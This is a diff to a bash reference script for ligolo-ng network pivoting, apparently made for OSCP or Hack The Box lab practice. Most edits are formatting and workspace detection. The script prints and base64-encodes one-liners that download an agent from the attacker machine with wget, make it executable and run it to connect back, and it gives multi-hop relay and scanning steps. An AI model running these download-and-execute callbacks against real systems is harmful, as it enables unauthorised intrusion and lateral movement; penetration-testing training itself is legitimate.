@@ -1,8 +1,10 @@
 #!/bin/bash
-
 # ============================================================================
 # LIGOLO-NG COMPREHENSIVE PIVOT SETUP & REFERENCE
-# Location: /home/alien/Desktop/OSCP/LIGOLO/tunnels.sh
+#
+# Portable: workspace is auto-detected from the script's own location.
+# Override by setting LIGOLO_DIR in the environment if needed.
+#
 # For OSCP advanced pivoting & network tunneling
 # ============================================================================
 
@@ -17,9 +19,10 @@ DIM='\033[2;37m'
 NC='\033[0m'
 BOLD='\033[1m'
 
+# Self-detect workspace (resolves symlinks). Override with env var if needed.
+LIGOLO_DIR="${LIGOLO_DIR:-$(cd -- "$(dirname -- "$(readlink -f -- "${BASH_SOURCE[0]}")")" &>/dev/null && pwd -P)}"
+
 ligoloup() {
-    # Configuration - Always run from LIGOLO directory
-    LIGOLO_DIR="/home/alien/Desktop/OSCP/LIGOLO"
     PROXY_BIN="$LIGOLO_DIR/proxy"
 
     # Change to LIGOLO directory (keeps all config & files in one place)
@@ -31,10 +34,11 @@ ligoloup() {
     # Clear screen and display comprehensive menu
     clear
     echo ""
-
     echo -e "${BOLD}=============================================="
-    echo -e "  LIGOLO-NG SETUP"
+    echo -e "       LIGOLO-NG SETUP"
     echo -e "==============================================${NC}"
+    echo -e "  ${GRAY}workspace: $LIGOLO_DIR${NC}"
+    echo -e "  ${GRAY}user:      $(whoami)${NC}"
     echo ""
 
     # -------------------------------------------------------------------------
@@ -44,38 +48,38 @@ ligoloup() {
     echo -e "  QUICK SUMMARY - WHICH CLIENT TO USE"
     echo -e "==============================================${NC}"
     echo ""
-    echo -e "  ${CYAN}Agent naming: ${YELLOW}ligolo_{TARGET}${NC}  (e.g. ligolo_amd64, ligolo_windows_amd64.exe)"
+    echo -e "  ${CYAN}Agent naming: ${YELLOW}ligolo_{TARGET}${NC} (e.g. ligolo_amd64, ligolo_windows_amd64.exe)"
     echo ""
-    echo -e "  ${GREEN}[+]${NC} Linux x86_64      → ${YELLOW}ligolo_amd64${NC}              ${GRAY}<- most common${NC}"
-    echo -e "  ${GREEN}[+]${NC} Linux aarch64     → ${YELLOW}ligolo_linux_arm64${NC}"
-    echo -e "  ${GREEN}[+]${NC} Linux armv7l      → ${YELLOW}ligolo_linux_armv7${NC}"
-    echo -e "  ${GREEN}[+]${NC} Linux armv6l      → ${YELLOW}ligolo_linux_armv6${NC}"
+    echo -e "  ${GREEN}[+]${NC} Linux x86_64      -> ${YELLOW}ligolo_amd64${NC}                ${GRAY}<- most common${NC}"
+    echo -e "  ${GREEN}[+]${NC} Linux aarch64     -> ${YELLOW}ligolo_linux_arm64${NC}"
+    echo -e "  ${GREEN}[+]${NC} Linux armv7l      -> ${YELLOW}ligolo_linux_armv7${NC}"
+    echo -e "  ${GREEN}[+]${NC} Linux armv6l      -> ${YELLOW}ligolo_linux_armv6${NC}"
     echo ""
-    echo -e "  ${GREEN}[+]${NC} Windows x86_64    → ${YELLOW}ligolo_windows_amd64.exe${NC}  ${GRAY}<- most common${NC}"
-    echo -e "  ${GREEN}[+]${NC} Windows arm64     → ${YELLOW}ligolo_windows_arm64.exe${NC}"
-    echo -e "  ${GREEN}[+]${NC} Windows armv7     → ${YELLOW}ligolo_windows_armv7.exe${NC}"
-    echo -e "  ${GREEN}[+]${NC} Windows armv6     → ${YELLOW}ligolo_windows_armv6.exe${NC}"
+    echo -e "  ${GREEN}[+]${NC} Windows x86_64    -> ${YELLOW}ligolo_windows_amd64.exe${NC}    ${GRAY}<- most common${NC}"
+    echo -e "  ${GREEN}[+]${NC} Windows arm64     -> ${YELLOW}ligolo_windows_arm64.exe${NC}"
+    echo -e "  ${GREEN}[+]${NC} Windows armv7     -> ${YELLOW}ligolo_windows_armv7.exe${NC}"
+    echo -e "  ${GREEN}[+]${NC} Windows armv6     -> ${YELLOW}ligolo_windows_armv6.exe${NC}"
     echo ""
-    echo -e "  ${GREEN}[+]${NC} macOS x86_64      → ${YELLOW}ligolo_darwin_amd64${NC}"
-    echo -e "  ${GREEN}[+]${NC} macOS arm64       → ${YELLOW}ligolo_darwin_arm64${NC}"
+    echo -e "  ${GREEN}[+]${NC} macOS x86_64      -> ${YELLOW}ligolo_darwin_amd64${NC}"
+    echo -e "  ${GREEN}[+]${NC} macOS arm64       -> ${YELLOW}ligolo_darwin_arm64${NC}"
     echo ""
-    echo -e "  ${GREEN}[+]${NC} FreeBSD x86_64    → ${YELLOW}ligolo_freebsd_amd64${NC}"
-    echo -e "  ${GREEN}[+]${NC} FreeBSD arm64     → ${YELLOW}ligolo_freebsd_arm64${NC}"
-    echo -e "  ${GREEN}[+]${NC} FreeBSD armv7     → ${YELLOW}ligolo_freebsd_armv7${NC}"
-    echo -e "  ${GREEN}[+]${NC} FreeBSD armv6     → ${YELLOW}ligolo_freebsd_armv6${NC}"
+    echo -e "  ${GREEN}[+]${NC} FreeBSD x86_64    -> ${YELLOW}ligolo_freebsd_amd64${NC}"
+    echo -e "  ${GREEN}[+]${NC} FreeBSD arm64     -> ${YELLOW}ligolo_freebsd_arm64${NC}"
+    echo -e "  ${GREEN}[+]${NC} FreeBSD armv7     -> ${YELLOW}ligolo_freebsd_armv7${NC}"
+    echo -e "  ${GREEN}[+]${NC} FreeBSD armv6     -> ${YELLOW}ligolo_freebsd_armv6${NC}"
     echo ""
-    echo -e "  ${GREEN}[+]${NC} OpenBSD x86_64    → ${YELLOW}ligolo_openbsd_amd64${NC}"
-    echo -e "  ${GREEN}[+]${NC} OpenBSD arm64     → ${YELLOW}ligolo_openbsd_arm64${NC}"
-    echo -e "  ${GREEN}[+]${NC} OpenBSD armv7     → ${YELLOW}ligolo_openbsd_armv7${NC}"
-    echo -e "  ${GREEN}[+]${NC} OpenBSD armv6     → ${YELLOW}ligolo_openbsd_armv6${NC}"
+    echo -e "  ${GREEN}[+]${NC} OpenBSD x86_64    -> ${YELLOW}ligolo_openbsd_amd64${NC}"
+    echo -e "  ${GREEN}[+]${NC} OpenBSD arm64     -> ${YELLOW}ligolo_openbsd_arm64${NC}"
+    echo -e "  ${GREEN}[+]${NC} OpenBSD armv7     -> ${YELLOW}ligolo_openbsd_armv7${NC}"
+    echo -e "  ${GREEN}[+]${NC} OpenBSD armv6     -> ${YELLOW}ligolo_openbsd_armv6${NC}"
     echo ""
     echo -e "  ${CYAN}Target checks:${NC}"
-    echo -e "  ${LGRAY}Linux/BSD : uname -s ; uname -m${NC}"
-    echo -e "  ${LGRAY}Windows   : echo %PROCESSOR_ARCHITECTURE%${NC}"
+    echo -e "    ${LGRAY}Linux/BSD : uname -s ; uname -m${NC}"
+    echo -e "    ${LGRAY}Windows   : echo %PROCESSOR_ARCHITECTURE%${NC}"
     echo ""
     echo -e "  ${CYAN}Examples:${NC}"
-    echo -e "  ${GRAY}x86_64  -> amd64    |  aarch64 -> arm64${NC}"
-    echo -e "  ${GRAY}armv7l  -> armv7    |  armv6l  -> armv6${NC}"
+    echo -e "    ${GRAY}x86_64 -> amd64   |  aarch64 -> arm64${NC}"
+    echo -e "    ${GRAY}armv7l -> armv7   |  armv6l  -> armv6${NC}"
     echo ""
 
     # Interface prompt -- accept either interface name (tun0, eth0) or a raw IP
@@ -100,8 +104,8 @@ ligoloup() {
     read -p "HTTP download port [80]: " HTTP_PORT
     HTTP_PORT=${HTTP_PORT:-80}
 
-    # Agent name prompts — table shown above for reference
-    read -p "Linux agent   [ligolo_amd64]: " LINUX_AGENT
+    # Agent name prompts -- table shown above for reference
+    read -p "Linux agent [ligolo_amd64]: " LINUX_AGENT
     LINUX_AGENT=${LINUX_AGENT:-ligolo_amd64}
 
     read -p "Windows agent [ligolo_windows_amd64.exe]: " WIN_AGENT
@@ -130,8 +134,8 @@ ligoloup() {
     echo -e "==============================================${NC}"
     echo ""
     echo -e "  ${GRAY}10 interfaces total -- one pair per pivot machine (up to 5):${NC}"
-    echo -e "  ${GRAY}  ligolomachineXX  -> 'start'     : ALL pivot ports via 240.0.0.X${NC}"
-    echo -e "  ${GRAY}  ligolonetXX -> 'autoroute' : internal subnet behind that pivot${NC}"
+    echo -e "  ${GRAY}  ligolomachineXX -> 'start'     : ALL pivot ports via 240.0.0.X${NC}"
+    echo -e "  ${GRAY}  ligolonetXX     -> 'autoroute' : internal subnet behind that pivot${NC}"
     echo ""
     echo -e "  ${CYAN}# Create ligolomachineXX interfaces (one per pivot, for 'start')${NC}"
     echo -e "  ${YELLOW}sudo ip tuntap add user \$(whoami) mode tun ligolomachine01 2>/dev/null; sudo ip link set ligolomachine01 up 2>/dev/null${NC}"
@@ -158,7 +162,7 @@ ligoloup() {
     echo -e "  ${CYAN}# Quick delete all (if needed)${NC}"
     echo -e "  ${LGRAY}for i in 01 02 03 04 05; do sudo ip link delete ligolomachine\$i 2>/dev/null; sudo ip link delete ligolonet\$i 2>/dev/null; done${NC}"
     echo -e "  ${LGRAY}sudo ip route del 240.0.0.1/32 dev ligolomachine01 2>/dev/null${NC}"
-    echo -e "  ${LGRAY}sudo ip route del 240.0.0.2/32 dev ligolomachine02 2>/dev/null   # repeat for 03 04 05${NC}"
+    echo -e "  ${LGRAY}sudo ip route del 240.0.0.2/32 dev ligolomachine02 2>/dev/null  # repeat for 03 04 05${NC}"
     echo ""
 
     # -------------------------------------------------------------------------
@@ -213,11 +217,11 @@ ligoloup() {
     echo ""
     echo -e "  ${CYAN}Each session gets its own dedicated interface pair:${NC}"
     echo ""
-    echo -e "  ${GREEN}[+]${NC} Session 1 -> ${YELLOW}240.0.0.1${NC}  via ${YELLOW}ligolomachine01${NC}  |  internal subnet via ${YELLOW}ligolonet01${NC}"
-    echo -e "  ${GREEN}[+]${NC} Session 2 -> ${YELLOW}240.0.0.2${NC}  via ${YELLOW}ligolomachine02${NC}  |  internal subnet via ${YELLOW}ligolonet02${NC}"
-    echo -e "  ${GREEN}[+]${NC} Session 3 -> ${YELLOW}240.0.0.3${NC}  via ${YELLOW}ligolomachine03${NC}  |  internal subnet via ${YELLOW}ligolonet03${NC}"
-    echo -e "  ${GREEN}[+]${NC} Session 4 -> ${YELLOW}240.0.0.4${NC}  via ${YELLOW}ligolomachine04${NC}  |  internal subnet via ${YELLOW}ligolonet04${NC}"
-    echo -e "  ${GREEN}[+]${NC} Session 5 -> ${YELLOW}240.0.0.5${NC}  via ${YELLOW}ligolomachine05${NC}  |  internal subnet via ${YELLOW}ligolonet05${NC}"
+    echo -e "  ${GREEN}[+]${NC} Session 1 -> ${YELLOW}240.0.0.1${NC} via ${YELLOW}ligolomachine01${NC}  |  internal subnet via ${YELLOW}ligolonet01${NC}"
+    echo -e "  ${GREEN}[+]${NC} Session 2 -> ${YELLOW}240.0.0.2${NC} via ${YELLOW}ligolomachine02${NC}  |  internal subnet via ${YELLOW}ligolonet02${NC}"
+    echo -e "  ${GREEN}[+]${NC} Session 3 -> ${YELLOW}240.0.0.3${NC} via ${YELLOW}ligolomachine03${NC}  |  internal subnet via ${YELLOW}ligolonet03${NC}"
+    echo -e "  ${GREEN}[+]${NC} Session 4 -> ${YELLOW}240.0.0.4${NC} via ${YELLOW}ligolomachine04${NC}  |  internal subnet via ${YELLOW}ligolonet04${NC}"
+    echo -e "  ${GREEN}[+]${NC} Session 5 -> ${YELLOW}240.0.0.5${NC} via ${YELLOW}ligolomachine05${NC}  |  internal subnet via ${YELLOW}ligolonet05${NC}"
     echo ""
     echo -e "  ${CYAN}HOW TO DETERMINE YOUR SESSION NUMBER:${NC}"
     echo -e "  ${GRAY}1. In ligolo console, run: tunnel_list${NC}"
@@ -225,8 +229,8 @@ ligoloup() {
     echo -e "  ${GRAY}3. Use 240.0.0.X / ligolomachineXX / ligolonetXX where X matches${NC}"
     echo ""
     echo -e "  ${CYAN}Example output:${NC}"
-    echo -e "  ${GRAY}| 1 | sequel\Ryan.Cooper@dc - 10.129.228.253:62784 | ligolomachine01 | Online |${NC}"
-    echo -e "  ${GRAY}| 2 | sequel\Bob.Smith@dc  - 10.129.228.253:62785  | ligolomachine02 | Online |${NC}"
+    echo -e "  ${GRAY}| 1 | sequel\\Ryan.Cooper@dc - 10.129.228.253:62784 | ligolomachine01 | Online |${NC}"
+    echo -e "  ${GRAY}| 2 | sequel\\Bob.Smith@dc   - 10.129.228.253:62785 | ligolomachine02 | Online |${NC}"
     echo ""
     echo -e "  ${YELLOW}-> Agent 1: 240.0.0.1 (start on ligolomachine01) + subnet (autoroute on ligolonet01)${NC}"
     echo -e "  ${YELLOW}-> Agent 2: 240.0.0.2 (start on ligolomachine02) + subnet (autoroute on ligolonet02)${NC}"
@@ -242,12 +246,12 @@ ligoloup() {
     echo -e "  ${CYAN}# Connect to session 1, start tunnel on ligolomachine01${NC}"
     echo -e "  ${YELLOW}session${NC}"
     echo -e "  ${YELLOW}1${NC}"
-    echo -e "  ${YELLOW}start${NC}   ${GRAY}# when prompted: select 'ligolomachine01'${NC}"
+    echo -e "  ${YELLOW}start${NC}  ${GRAY}# when prompted: select 'ligolomachine01'${NC}"
     echo ""
     echo -e "  ${CYAN}# Connect to session 2, start tunnel on ligolomachine02${NC}"
     echo -e "  ${YELLOW}session${NC}"
     echo -e "  ${YELLOW}2${NC}"
-    echo -e "  ${YELLOW}start${NC}   ${GRAY}# when prompted: select 'ligolomachine02'${NC}"
+    echo -e "  ${YELLOW}start${NC}  ${GRAY}# when prompted: select 'ligolomachine02'${NC}"
     echo ""
     echo -e "  ${CYAN}# Verify all sessions active${NC}"
     echo -e "  ${YELLOW}tunnel_list${NC}"
@@ -284,7 +288,7 @@ ligoloup() {
     echo -e "  ${GRAY}specific local address, or forwarding through to a second pivot's network.${NC}"
     echo ""
     echo -e "  ${CYAN}# Example: explicitly forward specific ports (rarely needed after 'start')${NC}"
-    echo -e "  ${LGRAY}listener_add --addr 240.0.0.1:445 --to 127.0.0.1:445 --tcp${NC}"
+    echo -e "  ${LGRAY}listener_add --addr 240.0.0.1:445  --to 127.0.0.1:445  --tcp${NC}"
     echo -e "  ${LGRAY}listener_add --addr 240.0.0.1:3389 --to 127.0.0.1:3389 --tcp${NC}"
     echo -e "  ${LGRAY}listener_add --addr 240.0.0.1:3306 --to 127.0.0.1:3306 --tcp${NC}"
     echo -e "  ${LGRAY}listener_add --addr 240.0.0.1:1433 --to 127.0.0.1:1433 --tcp${NC}"
@@ -304,10 +308,9 @@ ligoloup() {
     echo -e "==============================================${NC}"
     echo ""
     echo -e "  ${RED}[!]${NC} ${CYAN}'start'     -> select ligolomachineXX -> ALL pivot ports via 240.0.0.X${NC}"
-    echo -e "  ${RED}[!]${NC} ${CYAN}'autoroute' -> select ligolonetXX -> routes internal subnet behind pivot${NC}"
+    echo -e "  ${RED}[!]${NC} ${CYAN}'autoroute' -> select ligolonetXX     -> routes internal subnet behind pivot${NC}"
     echo -e "  ${RED}[!]${NC} ${CYAN}Both run simultaneously -- each session has its own dedicated interface pair${NC}"
     echo ""
-
     echo -e "${BOLD}=============================================="
     echo -e "  APPROACH 1: Access ALL Pivot Ports (SSH, HTTP, SQL, RDP...)"
     echo -e "==============================================${NC}"
@@ -318,7 +321,7 @@ ligoloup() {
     echo ""
     echo -e "  ${YELLOW}session${NC}"
     echo -e "  ${YELLOW}1${NC}"
-    echo -e "  ${YELLOW}start${NC}   ${GRAY}# > Select interface: ligolomachine01${NC}"
+    echo -e "  ${YELLOW}start${NC}  ${GRAY}# > Select interface: ligolomachine01${NC}"
     echo ""
     echo -e "  ${CYAN}# 240.0.0.1 is now the pivot's localhost -- scan everything:${NC}"
     echo -e "  ${YELLOW}nmap -p- -sV -Pn --open 240.0.0.1${NC}"
@@ -327,7 +330,6 @@ ligoloup() {
     echo -e "  ${LGRAY}xfreerdp /v:240.0.0.1${NC}"
     echo -e "  ${LGRAY}evil-winrm -i 240.0.0.1${NC}"
     echo ""
-
     echo -e "${BOLD}=============================================="
     echo -e "  APPROACH 2: Route Internal Network Behind Pivot"
     echo -e "==============================================${NC}"
@@ -339,16 +341,15 @@ ligoloup() {
     echo -e "  ${YELLOW}session${NC}"
     echo -e "  ${YELLOW}1${NC}"
     echo -e "  ${YELLOW}autoroute${NC}"
-    echo -e "  ${GRAY}# > Select routes to add:       [pick the internal subnet shown]${NC}"
+    echo -e "  ${GRAY}# > Select routes to add: [pick the internal subnet shown]${NC}"
     echo -e "  ${GRAY}# > Create new or use existing? Use an existing one${NC}"
-    echo -e "  ${GRAY}# > Select the interface:       ligolonet01${NC}"
-    echo -e "  ${GRAY}# > Start the tunnel?           Yes${NC}"
+    echo -e "  ${GRAY}# > Select the interface: ligolonet01${NC}"
+    echo -e "  ${GRAY}# > Start the tunnel? Yes${NC}"
     echo ""
     echo -e "  ${CYAN}# Kali now routes internal traffic through the pivot:${NC}"
     echo -e "  ${YELLOW}nmap -p- -sV -Pn --open 10.129.X.X${NC}"
     echo -e "  ${GRAY}# NOTE: 240.0.0.1 pivot ports are NOT accessible via autoroute (use Approach 1)${NC}"
     echo ""
-
     echo -e "${BOLD}=============================================="
     echo -e "  APPROACH 3: Both Pivot Ports AND Internal Network"
     echo -e "==============================================${NC}"
@@ -359,16 +360,16 @@ ligoloup() {
     echo ""
     echo -e "  ${YELLOW}session${NC}"
     echo -e "  ${YELLOW}1${NC}"
-    echo -e "  ${YELLOW}start${NC}     ${GRAY}# > Select interface: ligolomachine01  -> 240.0.0.1 all ports live${NC}"
+    echo -e "  ${YELLOW}start${NC}     ${GRAY}# > Select interface: ligolomachine01 -> 240.0.0.1 all ports live${NC}"
     echo ""
     echo -e "  ${YELLOW}autoroute${NC} ${GRAY}# still in session 1${NC}"
-    echo -e "  ${GRAY}# > Select routes:   [pick the internal subnet]${NC}"
-    echo -e "  ${GRAY}# > Interface:       ligolonet01  (NOT ligolomachine01 - already in use)${NC}"
-    echo -e "  ${GRAY}# > Start tunnel:    Yes${NC}"
+    echo -e "  ${GRAY}# > Select routes: [pick the internal subnet]${NC}"
+    echo -e "  ${GRAY}# > Interface: ligolonet01  (NOT ligolomachine01 - already in use)${NC}"
+    echo -e "  ${GRAY}# > Start tunnel: Yes${NC}"
     echo ""
     echo -e "  ${CYAN}# Verify both are active:${NC}"
-    echo -e "  ${LGRAY}ip route | grep 240.0.0           # pivot ports   (ligolomachineXX)${NC}"
-    echo -e "  ${LGRAY}ip route | grep ligolonet     # internal subnet (ligolonetXX)${NC}"
+    echo -e "  ${LGRAY}ip route | grep 240.0.0    # pivot ports (ligolomachineXX)${NC}"
+    echo -e "  ${LGRAY}ip route | grep ligolonet  # internal subnet (ligolonetXX)${NC}"
     echo ""
 
     # -------------------------------------------------------------------------
@@ -380,7 +381,7 @@ ligoloup() {
     echo ""
     echo -e "  ${CYAN}Topology:${NC}"
     echo -e "  ${GRAY}[Kali] -------- [Pivot 1] -------- [Pivot 2]${NC}"
-    echo -e "  ${GRAY}  tun0           240.0.0.1           240.0.0.2${NC}"
+    echo -e "  ${GRAY} tun0            240.0.0.1          240.0.0.2${NC}"
     echo ""
     echo -e "  ${CYAN}How it works:${NC}"
     echo -e "  ${GRAY}Pivot 2 cannot reach Kali directly. You make Pivot 1 relay the${NC}"
@@ -391,15 +392,15 @@ ligoloup() {
     echo -e "  ${CYAN}# -- Step 1: Relay ports on Pivot 1 (stay in session 1) --${NC}"
     echo -e "  ${GRAY}# These listeners make Pivot 1 forward incoming connections${NC}"
     echo -e "  ${GRAY}# to Kali's own services through the already-established tunnel.${NC}"
-    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:$PROXY_PORT --to 127.0.0.1:$PROXY_PORT --tcp${NC}  ${GRAY}# relay ligolo port${NC}"
-    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:$HTTP_PORT --to 127.0.0.1:$HTTP_PORT --tcp${NC}    ${GRAY}# relay download server${NC}"
-    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp${NC}              ${GRAY}# relay SMB (optional)${NC}"
+    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:$PROXY_PORT --to 127.0.0.1:$PROXY_PORT --tcp${NC} ${GRAY}# relay ligolo port${NC}"
+    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:$HTTP_PORT  --to 127.0.0.1:$HTTP_PORT  --tcp${NC} ${GRAY}# relay download server${NC}"
+    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:445         --to 127.0.0.1:445         --tcp${NC} ${GRAY}# relay SMB (optional)${NC}"
     echo ""
     echo -e "  ${CYAN}# -- Step 2: Find Pivot 1's internal IP --${NC}"
     echo -e "  ${GRAY}# Run ON Pivot 1 to find the LAN IP facing Pivot 2's network.${NC}"
     echo -e "  ${GRAY}# Use THIS IP in the next step -- NOT the HTB/VPN IP.${NC}"
-    echo -e "  ${LGRAY}ipconfig /all          (Windows)${NC}"
-    echo -e "  ${LGRAY}ip addr show           (Linux)${NC}"
+    echo -e "  ${LGRAY}ipconfig /all    (Windows)${NC}"
+    echo -e "  ${LGRAY}ip addr show     (Linux)${NC}"
     echo ""
     echo -e "  ${CYAN}# -- Step 3: Deploy agent on Pivot 2 --${NC}"
     echo -e "  ${GRAY}# Point the agent at Pivot 1's internal IP.${NC}"
@@ -411,10 +412,10 @@ ligoloup() {
     echo ""
     echo -e "  ${CYAN}# -- Step 4: Register Pivot 2 in ligolo --${NC}"
     echo -e "  ${GRAY}# Pivot 2's agent now appears as a new session in the proxy console.${NC}"
-    echo -e "  ${YELLOW}tunnel_list${NC}   ${GRAY}# confirm Pivot 2 shows up as session 2${NC}"
+    echo -e "  ${YELLOW}tunnel_list${NC}  ${GRAY}# confirm Pivot 2 shows up as session 2${NC}"
     echo -e "  ${YELLOW}session${NC}"
     echo -e "  ${YELLOW}2${NC}"
-    echo -e "  ${YELLOW}start${NC}     ${GRAY}# > Select interface: ligolomachine02  -> 240.0.0.2 all ports live${NC}"
+    echo -e "  ${YELLOW}start${NC}     ${GRAY}# > Select interface: ligolomachine02 -> 240.0.0.2 all ports live${NC}"
     echo -e "  ${YELLOW}autoroute${NC} ${GRAY}# > Select routes: [Pivot 2's internal subnet] -> Interface: ligolonet02 -> Yes${NC}"
     echo ""
     echo -e "  ${CYAN}# -- Step 5: Scan Pivot 2 --${NC}"
@@ -430,7 +431,7 @@ ligoloup() {
     echo ""
     echo -e "  ${CYAN}Topology:${NC}"
     echo -e "  ${GRAY}[Kali] --- [Pivot 1] --- [Pivot 2] --- [Pivot 3]${NC}"
-    echo -e "  ${GRAY}  tun0      240.0.0.1     240.0.0.2     240.0.0.3${NC}"
+    echo -e "  ${GRAY} tun0       240.0.0.1     240.0.0.2     240.0.0.3${NC}"
     echo ""
     echo -e "  ${CYAN}How it works:${NC}"
     echo -e "  ${GRAY}The same relay pattern repeats one level deeper. Pivot 2 now relays${NC}"
@@ -441,14 +442,14 @@ ligoloup() {
     echo -e "  ${CYAN}# -- Step 1: Relay ports on Pivot 2 (switch to session 2) --${NC}"
     echo -e "  ${YELLOW}session${NC}"
     echo -e "  ${YELLOW}2${NC}"
-    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:$PROXY_PORT --to 127.0.0.1:$PROXY_PORT --tcp${NC}  ${GRAY}# relay ligolo port${NC}"
-    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:$HTTP_PORT --to 127.0.0.1:$HTTP_PORT --tcp${NC}    ${GRAY}# relay download server${NC}"
-    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp${NC}              ${GRAY}# relay SMB (optional)${NC}"
+    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:$PROXY_PORT --to 127.0.0.1:$PROXY_PORT --tcp${NC} ${GRAY}# relay ligolo port${NC}"
+    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:$HTTP_PORT  --to 127.0.0.1:$HTTP_PORT  --tcp${NC} ${GRAY}# relay download server${NC}"
+    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:445         --to 127.0.0.1:445         --tcp${NC} ${GRAY}# relay SMB (optional)${NC}"
     echo ""
     echo -e "  ${CYAN}# -- Step 2: Find Pivot 2's internal IP --${NC}"
     echo -e "  ${GRAY}# Run ON Pivot 2 to find the LAN IP facing Pivot 3's network.${NC}"
-    echo -e "  ${LGRAY}ipconfig /all          (Windows)${NC}"
-    echo -e "  ${LGRAY}ip addr show           (Linux)${NC}"
+    echo -e "  ${LGRAY}ipconfig /all    (Windows)${NC}"
+    echo -e "  ${LGRAY}ip addr show     (Linux)${NC}"
     echo ""
     echo -e "  ${CYAN}# -- Step 3: Deploy agent on Pivot 3 --${NC}"
     echo -e "  ${GRAY}# Pivot 3 connects to Pivot 2's internal IP.${NC}"
@@ -459,10 +460,10 @@ ligoloup() {
     echo -e "  ${YELLOW}wget http://PIVOT2_INTERNAL_IP:$HTTP_PORT/$LINUX_AGENT -O /tmp/$LINUX_AGENT && chmod +x /tmp/$LINUX_AGENT && /tmp/$LINUX_AGENT -connect PIVOT2_INTERNAL_IP:$PROXY_PORT -ignore-cert${NC}"
     echo ""
     echo -e "  ${CYAN}# -- Step 4: Register Pivot 3 in ligolo --${NC}"
-    echo -e "  ${YELLOW}tunnel_list${NC}   ${GRAY}# confirm Pivot 3 shows up as session 3${NC}"
+    echo -e "  ${YELLOW}tunnel_list${NC}  ${GRAY}# confirm Pivot 3 shows up as session 3${NC}"
     echo -e "  ${YELLOW}session${NC}"
     echo -e "  ${YELLOW}3${NC}"
-    echo -e "  ${YELLOW}start${NC}     ${GRAY}# > Select interface: ligolomachine03  -> 240.0.0.3 all ports live${NC}"
+    echo -e "  ${YELLOW}start${NC}     ${GRAY}# > Select interface: ligolomachine03 -> 240.0.0.3 all ports live${NC}"
     echo -e "  ${YELLOW}autoroute${NC} ${GRAY}# > Select routes: [Pivot 3's internal subnet] -> Interface: ligolonet03 -> Yes${NC}"
     echo ""
     echo -e "  ${CYAN}# -- Step 5: Scan Pivot 3 --${NC}"
@@ -498,15 +499,15 @@ ligoloup() {
     echo -e "==============================================${NC}"
     echo ""
     echo -e "  ${CYAN}# If a tunnel fails -- delete and recreate the interface:${NC}"
-    echo -e "  ${YELLOW}interface_list${NC}                              ${GRAY}# Check active interfaces${NC}"
-    echo -e "  ${YELLOW}interface_del --name ligolomachine01${NC}        ${GRAY}# Delete specific machine interface${NC}"
-    echo -e "  ${YELLOW}interface_del --name ligolonet01${NC}       ${GRAY}# Delete specific internal interface${NC}"
-    echo -e "  ${YELLOW}tunnel_stop${NC}                                 ${GRAY}# Stop active tunnel${NC}"
-    echo -e "  ${YELLOW}tunnel_start${NC}                                ${GRAY}# Restart tunnel${NC}"
+    echo -e "  ${YELLOW}interface_list${NC}                       ${GRAY}# Check active interfaces${NC}"
+    echo -e "  ${YELLOW}interface_del --name ligolomachine01${NC} ${GRAY}# Delete specific machine interface${NC}"
+    echo -e "  ${YELLOW}interface_del --name ligolonet01${NC}     ${GRAY}# Delete specific internal interface${NC}"
+    echo -e "  ${YELLOW}tunnel_stop${NC}                          ${GRAY}# Stop active tunnel${NC}"
+    echo -e "  ${YELLOW}tunnel_start${NC}                         ${GRAY}# Restart tunnel${NC}"
     echo ""
     echo -e "  ${CYAN}# If target won't connect:${NC}"
-    echo -e "  ${YELLOW}ifconfig${NC}                         ${GRAY}# Show agent's network interfaces${NC}"
-    echo -e "  ${YELLOW}certificate_fingerprint${NC}          ${GRAY}# Check certificate${NC}"
+    echo -e "  ${YELLOW}ifconfig${NC}                ${GRAY}# Show agent's network interfaces${NC}"
+    echo -e "  ${YELLOW}certificate_fingerprint${NC} ${GRAY}# Check certificate${NC}"
     echo ""
     echo -e "  ${CYAN}# Clean up all interfaces from Kali terminal:${NC}"
     echo -e "  ${LGRAY}for i in 01 02 03 04 05; do sudo ip link delete ligolomachine\$i 2>/dev/null; sudo ip link delete ligolonet\$i 2>/dev/null; done${NC}"
@@ -520,16 +521,23 @@ ligoloup() {
     echo -e "==============================================${NC}"
     echo ""
     echo -e "  ${GREEN}[+]${NC} Working directory: ${YELLOW}${LIGOLO_DIR}${NC}"
-    echo -e "  ${GREEN}[+]${NC} Config file: ${YELLOW}${LIGOLO_DIR}/ligolo-ng.yaml${NC}"
+    echo -e "  ${GREEN}[+]${NC} Config file:       ${YELLOW}${LIGOLO_DIR}/ligolo-ng.yaml${NC}"
     echo -e "  ${GREEN}[+]${NC} All files stay in this directory"
     echo ""
+
+    # Sanity check: does the proxy binary actually exist where we expect?
+    if [[ ! -x "$PROXY_BIN" ]]; then
+        echo -e "  ${RED}[!]${NC} Proxy binary not found at $PROXY_BIN"
+        echo -e "  ${YELLOW}[*]${NC} Run setup-ligolo-arch.sh to install it."
+        return 1
+    fi
+
     echo -e "  ${YELLOW}[*] Starting proxy on 0.0.0.0:$PROXY_PORT...${NC}"
     echo ""
 
     # =========================================================================
     # PRE-COMPUTE ALL BASE64 VARIANTS
     # =========================================================================
-
     # Linux /tmp variants
     LINUX_WGET_TMP_CMD="wget http://$TUNIP:$HTTP_PORT/$LINUX_AGENT -O /tmp/$LINUX_AGENT&&chmod +x /tmp/$LINUX_AGENT&&/tmp/$LINUX_AGENT -connect $TUNIP:$PROXY_PORT -ignore-cert"
     LINUX_WGET_TMP_B64=$(printf '%s' "$LINUX_WGET_TMP_CMD" | base64 -w0)
@@ -567,43 +575,33 @@ ligoloup() {
     echo -e "  LINUX AGENT COMMANDS  [ $LINUX_AGENT ]"
     echo -e "==============================================${NC}"
     echo ""
-
     echo -e "  ${CYAN}# 1. wget -> /tmp (standard)${NC}"
     echo -e "  ${YELLOW}wget http://$TUNIP:$HTTP_PORT/$LINUX_AGENT -O /tmp/$LINUX_AGENT && chmod +x /tmp/$LINUX_AGENT && /tmp/$LINUX_AGENT -connect $TUNIP:$PROXY_PORT -ignore-cert${NC}"
     echo ""
-
